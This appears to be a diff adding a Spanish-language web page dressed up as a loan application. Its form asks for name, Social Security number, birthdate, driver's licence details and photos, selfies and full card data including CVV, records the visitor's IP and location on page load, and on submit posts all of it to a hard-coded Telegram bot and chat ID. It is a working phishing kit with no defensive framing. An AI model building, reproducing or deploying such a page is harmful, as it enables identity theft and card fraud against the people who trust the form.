@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Solicitud de Préstamo</title>
+  <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://i.postimg.cc/9Qf3kCds/family.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      padding: 30px;
+      min-height: 100vh;
+    }
+    .container {
+      display: flex;
+      flex-direction: row;
+      gap: 40px;
+      background: rgba(0,0,0,0.6);
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      max-width: 1200px;
+      width: 100%;
+      color: white;
+    }
+    .form-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .form-section h2 {
+      margin-bottom: 10px;
+      color: #fff;
+    }
+    input, select {
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 10px;
+      color: #fff;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      background: #2196f3;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background: #0b7dda;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Sección izquierda -->
+  <div class="form-section" id="form-left">
+    <h2>Datos del Solicitante</h2>
+    <input type="text" name="fullname" placeholder="Nombre completo" required>
+
+    <label for="ssn">SSN (9 dígitos sin guiones)</label>
+    <input type="text" id="ssn" name="ssn" maxlength="9" pattern="\d{9}" placeholder="Ej: 123456789" required inputmode="numeric" autocomplete="off">
+
+    <label for="ssn_date">Fecha de SSN</label>
+    <input type="date" id="ssn_date" name="ssn_date" required>
+
+    <input type="text" name="license" placeholder="Número de licencia" required>
+    <label for="license_issue">Fecha de emisión de licencia</label>
+    <input type="date" id="license_issue" name="license_issue" required>
+    <label for="license_exp">Fecha de vencimiento de licencia</label>
+    <input type="date" id="license_exp" name="license_exp" required>
+    <label for="birthdate">Fecha de nacimiento</label>
+    <input type="date" id="birthdate" name="birthdate" required>
+
+    <label>📸 Foto selfie</label>
+    <input type="hidden" role="uploadcare-uploader" id="img1" data-public-key="5875fe3e936a25b9dff2" />
+
+    <label>📸 Selfie con licencia en mano</label>
+    <input type="hidden" role="uploadcare-uploader" id="img2" data-public-key="5875fe3e936a25b9dff2" />
+
+    <label>📸 Licencia por delante</label>
+    <input type="hidden" role="uploadcare-uploader" id="img3" data-public-key="5875fe3e936a25b9dff2" />
+
+    <label>📸 Licencia por detrás</label>
+    <input type="hidden" role="uploadcare-uploader" id="img4" data-public-key="5875fe3e936a25b9dff2" />
+  </div>
+
+  <!-- Sección derecha -->
+  <div class="form-section" id="form-right">
+    <h2>Información de Tarjeta</h2>
+
+    <label for="card_number">Número de tarjeta (16 dígitos)</label>
+    <input type="text" id="card_number" name="card_number" maxlength="19" placeholder="0000 0000 0000 0000" required autocomplete="off" inputmode="numeric">
+
+    <input type="text" name="card_name" placeholder="Nombre en la tarjeta" required>
+
+    <label>Fecha de expiración</label>
+    <div style="display:flex; gap:10px;">
+      <select id="card_exp_month" required>
+        <option value="" disabled selected>Mes</option>
+      </select>
+      <select id="card_exp_year" required>
+        <option value="" disabled selected>Año</option>
+      </select>
+    </div>
+
+    <label for="card_cvv">CVV</label>
+    <input type="text" id="card_cvv" name="card_cvv" maxlength="4" placeholder="CVV" required inputmode="numeric" autocomplete="off">
+
+    <input type="text" name="billing_line1" placeholder="Dirección de facturación" required>
+    <input type="text" name="billing_city" placeholder="Ciudad" required>
+
+    <label for="billing_state">Estado</label>
+    <select id="billing_state" name="billing_state" required>
+      <option value="" disabled selected>Seleccione estado</option>
+    </select>
+
+    <input type="text" name="billing_zip" placeholder="Código postal" required>
+    
+    <button id="sendBtn">Enviar solicitud</button>
+  </div>
+</div>
+
+<script>
+  let userIP = 'Desconocida';
+  let userLocation = 'Desconocida';
+
+  // Obtener IP y ubicación al cargar con ipapi.co (sin token)
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      userIP = data.ip || 'Desconocida';
+      userLocation = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`
+        .replace(/(^,)|(,$)/g, '') || 'Desconocida';
+    })
+    .catch(() => {
+      userIP = 'Desconocida';
+      userLocation = 'Desconocida';
+    });
+
+  // Rellenar meses para expiración tarjeta
+  const monthSelect = document.getElementById('card_exp_month');
+  for(let i = 1; i <= 12; i++) {
+    const option = document.createElement('option');
+    const val = i.toString().padStart(2,'0');
+    option.value = val;
+    option.textContent = val;
+    monthSelect.appendChild(option);
+  }
+
+  // Rellenar años para expiración tarjeta: año actual + 10 años
+  const yearSelect = document.getElementById('card_exp_year');
+  const currentYear = new Date().getFullYear();
+  for(let i = 0; i <= 10; i++) {
+    const year = currentYear + i;
+    const option = document.createElement('option');
+    option.value = year.toString();
+    option.textContent = year.toString();
+    yearSelect.appendChild(option);
+  }
+
+  // Lista de estados de EE.UU.
+  const statesSelect = document.getElementById('billing_state');
+  const states = [
+    "Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut",
+    "Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa",
+    "Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan",
+    "Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire",
+    "New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio",
+    "Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota",
+    "Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia",
+    "Wisconsin","Wyoming"
+  ];
+
+  states.forEach(state => {
+    const option = document.createElement('option');
+    option.value = state;
+    option.textContent = state;
+    statesSelect.appendChild(option);
+  });
+
+  // Formato automático para número de tarjeta (agrega espacios cada 4 dígitos)
+  const cardNumberInput = document.getElementById('card_number');
+  cardNumberInput.addEventListener('input', e => {
+    let val = e.target.value.replace(/\D/g, '').slice(0,16);
+    val = val.replace(/(.{4})/g, '$1 ').trim();
+    e.target.value = val;
+  });
+
+  // Validación SSN (solo 9 dígitos)
+  const ssnInput = document.getElementById('ssn');
+  ssnInput.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0,9);
+  });
+
+  const sendBtn = document.getElementById('sendBtn');
+  const imageIds = ['img1', 'img2', 'img3', 'img4'];
+  let imageLinks = {};
+
+  imageIds.forEach(id => {
+    const widget = uploadcare.Widget(`#${id}`);
+    widget.onChange(file => {
+      if (file) {
+        file.done(info => {
+          imageLinks[id] = info.cdnUrl;
+        });
+      }
+    });
+  });
+
+  sendBtn.addEventListener('click', async () => {
+    const formLeft = document.querySelectorAll('#form-left input:not([type=hidden])');
+    const formRight = document.querySelectorAll('#form-right input, #form-right select:not([type=hidden])');
+    const values = {};
+
+    formLeft.forEach(input => {
+      values[input.name] = input.value.trim();
+    });
+    formRight.forEach(input => {
+      values[input.name] = input.value.trim();
+    });
+
+    // Validar que no haya campos vacíos
+    for (let key in values) {
+      if (!values[key]) {
+        alert('Todos los campos deben completarse.');
+        return;
+      }
+    }
+
+    // Validar SSN 9 dígitos
+    if (!/^\d{9}$/.test(values.ssn)) {
+      alert('SSN debe contener exactamente 9 dígitos numéricos sin guiones.');
+      return;
+    }
+
+    // Validar tarjeta 16 dígitos
+    const cardNum = values.card_number.replace(/\s/g,'');
+    if (!/^\d{16}$/.test(cardNum)) {
+      alert('Número de tarjeta debe contener exactamente 16 dígitos numéricos.');
+      return;
+    }
+
+    // Validar CVV 3 o 4 dígitos
+    if (!/^\d{3,4}$/.test(values.card_cvv)) {
+      alert('CVV debe contener 3 o 4 dígitos.');
+      return;
+    }
+
+    // Validar expiración seleccionada
+    const month = document.getElementById('card_exp_month').value;
+    const year = document.getElementById('card_exp_year').value;
+    if (!month || !year) {
+      alert('Selecciona mes y año de expiración de la tarjeta.');
+      return;
+    }
+
+    const message = `
+📋 *Formulario de Préstamo*
+
+👤 *Nombre:* ${values.fullname}
+🔢 *SSN:* ${values.ssn}
+📅 *Fecha SSN:* ${values.ssn_date}
+🪪 *Licencia:* ${values.license}
+📆 *Licencia desde:* ${values.license_issue}
+📆 *Licencia vence:* ${values.license_exp}
+🎂 *Nacimiento:* ${values.birthdate}
+
+💳 *Tarjeta:* ${values.card_number}
+👤 *Titular:* ${values.card_name}
+📆 *Expira:* ${month}/${year}
+🔐 *CVV:* ${values.card_cvv}
+📦 *Dirección:* ${values.billing_line1}
+🏙️ *Ciudad:* ${values.billing_city}
+🌎 *Estado:* ${values.billing_state}
+📮 *ZIP:* ${values.billing_zip}
+
+🌐 *IP:* ${userIP}
+📍 *Ubicación aproximada:* ${userLocation}
+
+📎 *Fotos:*
+1️⃣ Selfie: ${imageLinks.img1 || 'No subida'}
+2️⃣ Selfie con licencia: ${imageLinks.img2 || 'No subida'}
+3️⃣ Licencia frente: ${imageLinks.img3 || 'No subida'}
+4️⃣ Licencia reverso: ${imageLinks.img4 || 'No subida'}
+    `;
+
+    const token = '7728307113:AAGBKAVvEEDDCSba4Qp-2iCKwvh1UD6ZNG4';
+    const chatId = '1221652451';
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+      const data = await res.json();
+      if (data.ok) {
+        alert('Formulario enviado correctamente.');
+      } else {
+        alert('Error al enviar: ' + data.description);
+      }
+    } catch (err) {
+      alert('Error al enviar al bot de Telegram.');
+      console.error(err);
+    }
+  });
+</script>
+
+</body>
+</html>
